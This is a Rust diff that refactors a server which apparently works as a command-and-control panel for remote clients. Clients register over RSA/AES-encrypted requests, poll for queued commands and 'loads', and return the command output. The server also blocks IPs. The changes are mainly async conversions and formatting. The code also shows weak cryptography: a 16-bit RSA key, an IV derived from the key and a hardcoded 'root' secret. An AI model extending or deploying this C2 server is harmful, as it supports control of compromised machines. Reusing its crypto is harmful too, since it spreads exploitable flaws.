@@ -16,7 +16,7 @@ use std::{
     io::Read, net::IpAddr,
     process::Command,
     path::Path, 
-    sync::{Arc, RwLock}
+    sync::{Arc, RwLock},
 
 };
 
@@ -51,7 +51,7 @@ lazy_static! {
     static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
     static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
     static ref IP_DATABASE: Arc<RwLock<Vec<u8>>> = Arc::new(RwLock::new(vec![u8::from(0)]));
-    static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new( RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
+    static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new(RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
 }
 
 
@@ -78,18 +78,18 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
         Err(_) => {
             
             let parts: Vec<&str> = req_body.split("|").collect::<Vec<&str>>();
-   
             let client_bytes = (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &decode_block(parts[1]).unwrap());
+
             match client_bytes {
                 Ok(_) => (),
                 Err(_) => {
                     fprint("error", "Client sent a registration request encrypted with the wrong RSA key.");
                     drop(connection); return resp_badrequest();
                 }
-            }; let client_bytes = client_bytes.unwrap();
-
-            let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypt_string_withkey(parts[0], &client_bytes).unwrap()).unwrap()).expect("erm");
-
+            }; 
+            
+            let client_bytes = client_bytes.unwrap();
+            let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypt_string_withkey(parts[0], &client_bytes).await.unwrap()).unwrap()).expect("erm");
             let server_bytes = Randomizer::new(32, Some(Charset::AnyByte)).bytes().unwrap();
 
             // Key formatted like this: (encryption key).(time (past this, key is invalid))
@@ -115,12 +115,12 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                 key_to_string(&json, "username"),
                 &*API_SECRET.read().unwrap()
             ))[..16]);
+
             // This prevents clients that have blocked IPs from sending registration requests to the server.
             if is_client_blocked(&mut connection, &client_id, &ip).await {
                 fprint("failure", &format!("({}) {} tried to send a request whilst blocked.", ip.red(), client_id.red()));
                 drop(connection); return resp_unauthorised();
             }
-
 
             if is_client(&mut connection, &client_id).await {
                 // Maybe remove this fraction.
@@ -234,12 +234,12 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             drop(connection); return resp_ok_encrypted(&json!({
                 "client_id": &client_id,
                 "server_bytes": encode_block(&server_bytes)
-            }).to_string(), &client_bytes);
+            }).to_string(), &client_bytes).await;
         },
     };
 
     let encryption_key = encryption_key.unwrap();
-    let decrypted_body = decrypt_string_withkey(&req_body[16..], &encryption_key.as_bytes());
+    let decrypted_body = decrypt_string_withkey(&req_body[16..], &encryption_key.as_bytes()).await;
 
     match decrypted_body {
         Ok(_) => (),
@@ -283,7 +283,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             match command_info {
                 Ok(_) => (),
                 Err(GenericError::NoRows) => {
-                    drop(connection); return resp_ok_encrypted("Ok", encryption_key.as_bytes());
+                    drop(connection); return resp_ok_encrypted("Ok", encryption_key.as_bytes()).await;
                 },
                 Err(_) => {
                     fprint("error", "At gateway (command_info)");
@@ -297,7 +297,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
                 "command_id": command_id,
                 "cmd_args": cmd_args,
                 "cmd_type": cmd_type
-            }).to_string(),  encryption_key.as_bytes());
+            }).to_string(),  encryption_key.as_bytes()).await;
 
         } else {
             fprint("failure", &format!("({}) {} tried sending a heartbeat with an invalid client id. No action taken.", ip.red(), client_id.red()));
@@ -377,7 +377,7 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
             update_last_seen(&mut connection, &client_id).await;        
 
-            drop(connection); return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes());
+            drop(connection); return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
         } else {
             fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
             drop(connection); return resp_badrequest();
@@ -417,9 +417,9 @@ async fn api_issue(req_body: String) -> impl Responder {
             params! {
                 "load_id" => &load_id,
                 "cmd_args" => key_to_string(&json, "cmd_args"),
+                "cmd_type" => key_to_string(&json, "cmd_type"),
                 "required_amount" => key_to_u64(&json, "required_amount"),
                 "recursive_load" => key_to_bool(&json, "recursive"),
-                "cmd_type" => key_to_string(&json, "cmd_type"),
                 "time_issued" => get_timestamp(),
             }
         ).await;
@@ -504,6 +504,7 @@ async fn api_clients_list(req_body: String) -> impl Responder {
                 }
             );            
         }
+
 
         drop(connection); return resp_ok(json_clients_list.to_string());
     } else {
@@ -767,6 +768,8 @@ async fn main() -> std::io::Result<()> {
     fs::create_dir_all("artifacts/databases").unwrap();
     fs::create_dir_all("artifacts/outputs").unwrap();
 
+    File::create("artifacts/log.txt").unwrap();
+
     match json_config {
         Ok(_) => (),
         Err(_) => {
@@ -928,6 +931,7 @@ async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {
 
 async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::result::Result<String, GenericError> {
 
+    let connection_interval =  *CONNECTION_INTERVAL.read().unwrap();
     let encryption_key_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
         r"SELECT encryption_key FROM clients WHERE client_id = :client_id",
         params! {
@@ -947,7 +951,7 @@ async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::r
 
             if 
                 current_time >= split_key[1].parse::<u64>().unwrap() && 
-                (get_last_seen(connection, &client_id).await + *CONNECTION_INTERVAL.read().unwrap()) <= current_time
+                (get_last_seen(connection, &client_id).await + connection_interval) <= current_time
             {
                 return Err(GenericError::_Expired)
             } else {
@@ -1251,7 +1255,7 @@ fn get_timestamp() -> u64 {
     return since_the_epoch.as_secs()
 }
 
-fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
+async fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
     let cipher = Cipher::aes_256_cbc();
 
     let mut encrypter = Crypter::new(cipher, Mode::Encrypt, key, Some(&key[..16]))?;
@@ -1266,7 +1270,7 @@ fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<St
 }
 
 
-fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
+async fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
     let ciphertext = decode_block(ciphertext).unwrap();
     let cipher = Cipher::aes_256_cbc();
     let mut decrypter = Crypter::new(cipher, Mode::Decrypt, key, Some(&key[..16]))?;
@@ -1290,6 +1294,7 @@ fn fprint(stype: &str, sformatted: &str) -> () {
         "task" => stype.to_uppercase().yellow(),
         _ => stype.to_uppercase().white(),
     };
+
 
     println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
 }
@@ -1379,8 +1384,8 @@ fn resp_ok(message: String) -> HttpResponse {
     return HttpResponse::build(StatusCode::OK).body(message);
 }
 
-fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
-    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).unwrap());
+async fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
+    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).await.unwrap());
 }
 
 // ------------------------ Init Functions ------------------------
@@ -1483,7 +1488,6 @@ async fn initialize_tables(connection_pool: Pool) {
 }
 
 // ------------------------ Main Program ------------------------
-
 
 #[derive(Debug)]
 enum GenericError {
